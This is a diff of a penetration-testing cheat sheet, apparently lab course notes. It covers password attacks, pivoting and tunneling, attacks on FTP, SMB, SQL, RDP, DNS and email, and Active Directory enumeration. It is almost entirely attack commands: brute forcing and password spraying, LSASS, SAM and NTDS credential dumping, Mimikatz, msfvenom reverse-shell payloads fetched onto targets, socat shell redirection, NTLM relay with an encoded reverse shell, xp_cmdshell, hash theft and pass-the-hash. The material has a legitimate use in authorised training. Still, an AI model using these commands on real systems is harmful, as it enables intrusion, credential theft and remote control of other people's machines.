 # Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
 hydra -L user.list -P password.list <service>://<ip>
@@ -934,12 +1254,14 @@ crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
 # Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
 crackmapexec smb <ip> -u <username> -p <password> --ntds
 ```
-##### Windows Password Attacks
+
+### Windows Credential Harvesting
+
 ```
 # Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
-# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
+# A PowerShell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
 Get-Process lsass
 
 # Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
@@ -957,27 +1279,31 @@ move sam.save \\<ip>\NameofFileShare
 # Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
-##### Linux Password Attacks
+
+### Linux Credential Hunting
+
 ```
 # Script that can be used to find .conf, .config and .cnf files on a Linux system.
-for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "lib|fonts|share|core" ;done
 
 # Script that can be used to find credentials in specified file types.
-for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done
+for i in $(find / -name *.cnf 2>/dev/null | grep -Ev "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done
 
 # Script that can be used to find common database files.
-for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "doc|lib|headers|share|man";done
 
 # Uses Linux-based find command to search for text files.
-find /home/* -type f -name "*.txt" -o ! -name "*.*"
+find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \)
 
 # Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
 grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 ```
-##### Cracking Passwords
+
+### Cracking Passwords
+
 ```
 # Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
-hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show
+hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt --show
 
 # Runs John in conjunction with a wordlist to crack a pdf hash.
 john --wordlist=rockyou.txt pdf.hash
@@ -991,8 +1317,21 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 # Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
 office2john.py Protected.docx > protected-docx.hash
 ```
-## Pivoting, Tunneling, and Port Forwarding
-##### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+
+### Login Brute Forcing (Hydra)
+
+```
+# Basic Auth Brute Force - User/Pass Wordlists
+hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
+
+# Login Form Brute Force - Static User, Pass Wordlist
+hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+```
+
+## 8. Pivoting, Tunneling & Port Forwarding
+
+### SSH Local Port Forwarding
+
 ```
 # netstat -r or ip route.
 # Executing the Local Port Forward:---> We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port
@@ -1002,42 +1341,44 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64  --> Forwar
 ssh -L localhost:AnyLocalPort:DestinationIP:DestinationPort username@<JUmServerIP/MIddleServerIP>
 ssh -L AnyLocalPort:localhost:DestinationPort -L AnyLocalPort2:localhost:DestinationPort2 username@DestinationIP
 
-# To Verifiy the local port forwarding
+# To Verify the local port forwarding
 netstat -antp | grep 1234
 nmap -v -sV -pLocalPort localhost
 ```
 
-##### Scan another hosts, on different network (via dynamic port forwarding and ( Socks listener on local port like 9050 and proxy to send packages and nmap requests)
-<img width="2108" height="1184" alt="22" src="https://github.com/user-attachments/assets/aa4019a7-fc9f-497f-b9c7-d537936f17f3" />
+### SSH Dynamic Port Forwarding (SOCKS)
 
+<img width="2108" height="1184" alt="22" src="https://github.com/user-attachments/assets/aa4019a7-fc9f-497f-b9c7-d537936f17f3" />
 
 ```
 # Enabling Dynamic Port Forwarding with SSH:---> dynamic port forwarding, where we can send packets to a remote network via a pivot host.
 1) ssh -D AnyLocalPort(9050) username@DestinationIP
 2) Checking /etc/proxychains.conf
 tail -4 /etc/proxychains.conf
-	# meanwile
+	# meanwhile
 	# defaults set to "tor"
 	socks4 	127.0.0.1 9050
-	
-# Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
+
+# Now when you start Nmap with proxychains using the command below, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
 3) Using Nmap with Proxychains (SOCKS tunneling
 	proxychains nmap -v -sn 172.16.5.1-200
-	
+
 	# Enumerating the Windows Target through Proxychains (Windows Defender firewall blocks ICMP requests (traditional pings) by default.)
 	proxychains nmap -v -Pn -sT 172.16.5.19
 	proxychains4 -f /home/kali/recon/proxychains.conf nmap -v -Pn -sT 172.16.5.19
-	
+
 # Using Metasploit with Proxychains
 proxychains msfconsole
 msf6 > search rdp_scanner
 msf6 > use 0
 
 # Using xfreerdp with Proxychains
-proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:<PASSWORD>
 
 ```
-##### Remote/Reverse Port Forwarding with SSH:--->  we might want to forward a local service to the remote port as well.
+
+### SSH Remote/Reverse Port Forwarding
+
 ```
 #Creating a Windows Payload with msfvenom
 msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
@@ -1064,9 +1405,11 @@ PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backups
 Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
 
 ```
-##### Meterpreter Tunneling & Port Forwarding
+
+### Meterpreter Tunneling & Port Forwarding
+
 ```
-# we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.
+# we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the command below, which will return a shell on our attack host on port 8080.
 # Creating Payload for Ubuntu Pivot Host
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
 
@@ -1082,18 +1425,21 @@ run
 	-> ls
 	-> chmod +x backupjob
 	-> ./backupjob
-	
+
 # Meterpreter Session Establishment
 meterpreter > pwd
 
 #  **firewall allowing ping (ICMP) **
 # Ping Sweep
 meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
-OR for linux
+# OR
+for linux
 for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
-OR for windows cmd
+# OR
+for windows cmd
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
-OR for windows powershell
+# OR
+for windows powershell
 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
 
 #  **IF firewall blocks ping (ICMP) **
@@ -1108,7 +1454,7 @@ OR for windows powershell
 	-> options
 	-> jobs
 
-# After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
+# After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the line below at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
 # Adding a Line to proxychains.conf if Needed
 -> socks4  127.0.0.1 9050
 
@@ -1131,28 +1477,28 @@ meterpreter > run autoroute -p
 proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 
 ----------------------------------------------------------------------------
-### Port Forwarding with Meterpreter's
+# Port Forwarding with Meterpreter
 # Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
 meterpreter > help portfwd
-# Creating Local TCP Relay (The blow command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)
+# Creating Local TCP Relay (The command below requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 
 # Connecting to Windows Target through localhost
-xfreerdp /v:localhost_OR_IP_ofYOurIPtunneling:3300 /u:victor /p:pass@123
+xfreerdp /v:localhost:3300 /u:victor /p:<PASSWORD>
 
 netstat -antp
 
 ----------------------------------------------------------------------------
 # Meterpreter Reverse Port Forwarding
-# We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
+# We can create a reverse port forward on our existing shell from the previous scenario using the command below. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
 # Reverse Port Forwarding Rules
 meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
-# Configuring & Starting multi/handler 
+# Configuring & Starting multi/handler
 meterpreter > bg
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 > set LPORT 8081
-> set LHOST 0.0.0.0 
+> set LHOST 0.0.0.0
 > run
 # We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.
 
@@ -1164,15 +1510,17 @@ msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 meterpreter > shell
 
 ```
-##### Socat Redirection with a Reverse Shell
+
+### Socat Redirection — Reverse Shell
+
 ```
 # We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu(pivot) server.
 # Starting Socat Listener on a Ubuntu(pivot) server.
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 
-# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). 
+# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18).
 # Creating the Windows Payload from our attack host
-sword0x00@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+user@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 
 # Configuring & Starting the multi/handler on our attack host
 use exploit/multi/handler
@@ -1181,13 +1529,15 @@ set lhost 0.0.0.0
 set lport 80
  run
 ```
-##### Socat Redirection with a Bind Shell
+
+### Socat Redirection — Bind Shell
+
 ```
 # We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
 # Creating the Windows Payload
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 
-# Starting Socat Bind Shell Listeneron a Ubuntu(pivot) server.
+# Starting Socat Bind Shell Listener on a Ubuntu(pivot) server.
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 
 # Configuring & Starting the Bind multi/handler on our attacker host
@@ -1197,7 +1547,9 @@ set RHOST 10.129.202.64
 set LPORT 8080
 run
 ```
-##### Web Server Pivoting with Rpivot
+
+### Rpivot
+
 ```
 attack machine -> git clone https://github.com/klsecservices/rpivot.git
 attack machine -> python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
@@ -1215,82 +1567,110 @@ attack machine -> proxychains curl --noproxy '*' http://172.16.5.135:80
 Pivot machine -> python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 
 ```
-##### Port Forwarding with Windows: Netsh
+
+### Windows netsh Port Proxy
+
 ```
 - 10.10.16.83 #kali ip
 - ( 10.129.42.198 # Windows public IP and 172.16.5.150 # Windows private IP)
 - 172.16.5.19 # DC01/victor machine
 
->> from windows public IP (after pwn the pivot host)
+# from windows public IP (after pwn the pivot host)
 netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
->> Verifying Port Forward from the pwn the pivot host
+# Verifying Port Forward from the pwn the pivot host
 netsh.exe interface portproxy show v4tov4
 
->> then go to the attacker host 
-xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
+# then go to the attacker host
+xfreerdp /v:10.129.42.198:8080 /u:victor /p:<PASSWORD>
 
 ```
-##### DNS Tunneling with Dnscat2
+
+### Dnscat2 DNS Tunneling
+
 ```
->> from attack host (server side):-
+# from attack host (server side):-
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/server/
 sudo gem install bundler
 sudo bundle install
 sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 
->> Then colning the clinde script to attack host too.
+# Then cloning the client script to attack host too.
 git clone https://github.com/lukebaggett/dnscat2-powershell.git
 
->> copy the dnscat2-powershell.py script to the pivot host or the victom host
+# copy the dnscat2-powershell.py script to the pivot host or the victim host
 
->> from pivot/victm host (client side):-
+# from pivot/victim host (client side):-
 - Import-Module .\dnscat2.ps1
-- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <PRE_SHARED_SECRET> -Exec cmd
 		dnscat2> ?
 		dnscat2> window -i 1
 ```
-##### SOCKS5 Tunneling with Chisel
-```
->> from attack host (client side) to setup:-
+
+### Chisel SOCKS5
+
+#### Build and Serve
+
+```bash
 git clone https://github.com/jpillora/chisel.git
 cd chisel
 go build
-OR 
+# OR static build
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static
 file chisel_static
 scp chisel ubuntu@10.129.202.64:~/
+```
 
->> Running the Chisel Server on the Pivot Host
+#### Reverse SOCKS Proxy (Pivot as Server)
+
+```bash
+# On the pivot host
 ./chisel server -v -p 1234 --socks5
 
->> Connecting to the Chisel Server from the client:-
+# On the attack host
 ./chisel client -v 10.129.202.64:1234 socks
-tail -n 20 /etc/proxychains4.conf
+```
+
+Point proxychains at the local SOCKS listener:
+
+```bash
 sudo nano /etc/proxychains4.conf
-# socks4  127.0.0.1 9050
+# socks4 127.0.0.1 9050
 socks5 127.0.0.1 1080
-proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
 
-#### Chisel Reverse Pivot (In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.)
+```bash
+proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
+```
 
->> Starting the Chisel Server on our Attack Host
+#### Chisel Reverse Pivot (Attack Host as Server)
+
+Use this when firewall rules block inbound connections to the pivot.
+
+```bash
+# Attack host
 sudo ./chisel server --reverse -v -p 1234 --socks5
 
->> Connecting the Chisel Client to our Attack Host from pivot host:-
-ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+# Pivot host
+./chisel client -v 10.10.14.17:1234 R:socks
+```
 
->> Editing & Confirming proxychains.conf
-sword0x00@htb[/htb]$ tail -f /etc/proxychains.conf
-# socks4    127.0.0.1 9050
+Confirm proxychains:
+
+```bash
+tail -f /etc/proxychains.conf
+# socks4 127.0.0.1 9050
 socks5 127.0.0.1 1080
+```
 
-proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```bash
+proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
+```
+
+### ICMP Tunneling (ptunnel-ng)
 
 ```
-##### ICMP Tunneling with SOCKS ( in case ICMP enabled via firewall) 
-```
->> Run these commands on your attacker machine, not on the pivot.
+# Run these commands on your attacker machine, not on the pivot.
 sudo apt update
 sudo apt install -y git build-essential automake autoconf
 git clone https://github.com/utoni/ptunnel-ng.git
@@ -1298,69 +1678,68 @@ cd ptunnel-ng
 sudo ./autogen.sh
 ls -l src/ptunnel-ng
 
->> Transfer the files to the pivot
+# Transfer the files to the pivot
 scp -r ptunnel-ng ubuntu@10.129.202.64:~/
 
->> Step 4 — Start the ICMP tunnel server on the pivot
+# Step 4 — Start the ICMP tunnel server on the pivot
 cd ~/ptunnel-ng/src
 sudo ./ptunnel-ng -r10.129.202.64 -R22
 
->> Step 5 — Start the tunnel client on the attacker
+# Step 5 — Start the tunnel client on the attacker
 cd ~/ptunnel-ng/src
 sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 
->> Step 6 — Test SSH through the tunnel OR make Enabling Dynamic Port Forwarding over SSH
+# Step 6 — Test SSH through the tunnel
 ssh -p 2222 -l ubuntu 127.0.0.1
-OR
+# OR
 ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1
 
->> Step 8 — Configure ProxyChains
+# Step 7 — Configure ProxyChains
 sudo nano /etc/proxychains4.conf
 socks5 127.0.0.1 9050
 
->> Step 9 — Test access to the internal RDP port
+# Step 8 — Test access to the internal RDP port
 proxychains nmap -sV 172.16.5.19 -p3389
 proxychains4 nmap -sT -Pn -n -sV -p 3389 172.16.5.19
 
->> Connect to RDP
+# Connect to RDP
 proxychains xfreerdp /v:172.16.5.19
 proxychains4 xfreerdp /v:172.16.5.19 /u:USERNAME
 
-
 ```
-## Attacking Common Services
-##### Attacking FTP
+
+## 9. Attacking Common Services
+
+### FTP
+
 ```
 # Brute Forcing
 medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
 hydra -L users.txt -P passwords.txt -s 21 ftp://10.1.1.1
 
 # FTP Bounce Attack
-nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+nmap -Pn -v -n -p80 -b anonymous:<PASSWORD>@10.10.110.213 172.17.0.2
 ```
 
-##### Attacking SMB
+### SMB
 
 ```
-# Network share enumeration using smbmap.
-smbmap -H 10.129.14.128
-
 # Null-session with the rpcclient.
 rpcclient -U'%' 10.10.110.17
 
 # Execute a command over the SMB service using crackmapexec.
-crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
-crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
-impacket-psexec administrator:'Password123!'@10.10.110.17
+crackmapexec smb 10.10.110.17 -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p '<PASSWORD>' --local-auth
+impacket-psexec administrator:'<PASSWORD>'@10.10.110.17
 
 # Enumerating Logged-on Users
-crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+crackmapexec smb 10.10.110.0/24 -u administrator -p '<PASSWORD>' --loggedon-users
 
 # Extract hashes from the SAM database.
-crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+crackmapexec smb 10.10.110.17 -u administrator -p '<PASSWORD>' --sam
 
-# Pass-the-Hash (PtH) Techniqe
-crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+# Pass-the-Hash (PtH) Technique
+crackmapexec smb 10.10.110.17 -u Administrator -H <NTLM_HASH>
 
 # Dump the SAM database using impacket-ntlmrelayx.
 cat /etc/responder/Responder.conf | grep 'SMB ='
@@ -1369,13 +1748,15 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
 ```
-##### Attacking SQL
+
+### SQL (MySQL & MSSQL)
+
 ```
 # SQLEXPRESS
 EXECUTE sp_configure 'show advanced options', 1
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
-xp_cmdshell 'whoami'     --> MSQL
+xp_cmdshell 'whoami'
 
 # MySQL - Write Local File
 SELECT @@version_compile_os;
@@ -1407,8 +1788,7 @@ show variables like "secure_file_priv";
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 # MySQL - Read Local Files in MySQL
 mysql> select LOAD_FILE("/etc/passwd");
-mysql> SELECT LOAD_FILE(“C:/Users/Administrator/Desktop/flag.txt”);
-
+mysql> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
 
 # Hash stealing using the xp_dirtree command in MSSQL.
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
@@ -1416,7 +1796,7 @@ EXEC master..xp_dirtree '\\10.10.110.17\share\'
 # Hash stealing using the xp_subdirs command in MSSQL.
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
 
-# Retrieve the hash 
+# Retrieve the hash
 sudo responder -I tun0
 sudo impacket-smbserver share ./ -smb2support
 
@@ -1445,16 +1825,18 @@ SELECT srvname, isremote FROM sysservers
 # Identify the user and its privileges used for the remote connection in MSSQL.
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 ```
-##### Attacking RDP
+
+### RDP
+
 ```
-nmap -Pn -p3389 192.168.2.143 
+nmap -Pn -p3389 192.168.2.143
 
 # Crowbar and Hydra - RDP Password Spraying
-crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
-hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c '<PASSWORD>'
+hydra -L usernames.txt -p '<PASSWORD>' 192.168.2.143 rdp
 
 # RDP Login
-rdesktop -u admin -p password123 192.168.2.143
+rdesktop -u admin -p <PASSWORD> 192.168.2.143
 
 # RDP Session Hijacking
 tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
@@ -1464,10 +1846,12 @@ net start sessionhijack
 
 # RDP Pass-the-Hash (PtH)
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+xfreerdp /v:192.168.220.152 /u:lewen /pth:<NTLM_HASH>
 
 ```
-##### Attacking DNS
+
+### DNS
+
 ```
 nmap -p53 -Pn -sV -sC 10.10.110.213
 
@@ -1486,10 +1870,10 @@ python3 subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt
 
 host support.inlanefreight.com
 
-The can-i-take-over-xyz repository is also an excellent reference for a subdomain takeover vulnerability.
+# Reference: https://github.com/EdOverflow/can-i-take-over-xyz
 
 # DNS Spoofing
-> cat /etc/ettercap/etter.dns  >>> to be >>> targetdomian.io	A	Attacker_IP
+> cat /etc/ettercap/etter.dns  >>> to be >>> targetdomain.io	A	Attacker_IP
 > Start Ettercap
 > navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
 > Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
@@ -1498,54 +1882,56 @@ The can-i-take-over-xyz repository is also an excellent reference for a subdomai
 > ping inlanefreight.com
 
 ```
-##### Attacking Email Services
-```
+
+### Email (SMTP & POP3)
+
+```bash
 sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
 
-# DNS lookup for mail servers for the specified domain
+# MX records
 host -t MX microsoft.com
-
-#  DNS lookup for mail servers for the specified domain
 dig mx inlanefreight.com | grep "MX" | grep -v ";"
 
-#  DNS lookup of the IPv4 address for the specified subdomain.
+# A record for a mail host
 host -t A mail1.inlanefreight.htb.
 
-# Connect to the SMTP server. >>> VRFY, EXPN, and RCPT TO, USER 
+# SMTP interaction — VRFY, EXPN, RCPT TO, USER
 telnet 10.10.110.20 25
 
-# SMTP user enumeration using the RCPT command against the specified host
+# SMTP user enumeration with RCPT
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
-# Enum for cloud mail services
-o365spray or MailSnipery for  Microsoft Office 365 (O365), or CredKing for Gmail or Okta
+# Cloud mail services: o365spray (O365), MailSniper (O365), CredKing (Gmail/Okta)
 python3 o365spray.py --validate --domain msplaintext.xyz
 python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
-python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+python3 o365spray.py --spray -U usersfound.txt -p '<PASSWORD>' --count 1 --lockout 1 --domain msplaintext.xyz
 
-# Brute-forcing the POP3 service.
-hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+# POP3 brute force
+hydra -L users.txt -p '<PASSWORD>' -f 10.10.110.20 pop3
 
-# Testing the SMTP service for the open-relay vulnerability.
+# SMTP open relay
 nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
 ```
-## Active Directory
-#### Initial Enumeration
+
+## 10. Active Directory
+
+### Initial Enumeration
+
 ```
 # Dump credentials with Mimikatz:
 .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 
-# Responder 
+# Responder
 sudo responder -I ens224 -A
 
 # Inveigh
 Import-Module .\Inveigh.ps1
 (Get-Command Invoke-Inveigh).Parameters
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
-OR 
+# OR
 .\Inveigh.exe
 GET NTLMV2UNIQUE
 GET NTLMV2USERNAMES
@@ -1553,18 +1939,22 @@ GET NTLMV2USERNAMES
 # Performs a ping sweep on the specified network segment from a Linux-based host
 fping -asgq 172.16.5.0/23
 
-# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
+# Enumerate usernames with Kerbrute against the domain and DC, writing results to a file.
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
-##### LLMNR Poisoning
+
+### LLMNR/NBT-NS Poisoning
+
 ```
 # Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
-##### Password Spraying and Password Policies
+
+### Password Spraying & Password Policy
+
 ```
-# Uses CME to extract  password policy
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+# Uses CME to extract password policy
+crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD> --pass-pol
 
 # Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
 rpcclient -U "" -N 172.16.5.5
@@ -1576,10 +1966,9 @@ rpcclient $> querydominfo
 enum4linux -P 172.16.5.5
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
 
-# Using Enumerating Null Session - from Windows | see the differenct responses for differnet usernames.
+# Using Enumerating Null Session - from Windows | see the different responses for different usernames.
 net use \\DC01\ipc$ "" /u:""
-net use \\DC01\ipc$ "password" /u:guest
-net use \\DC01\ipc$ "password" /u:guest
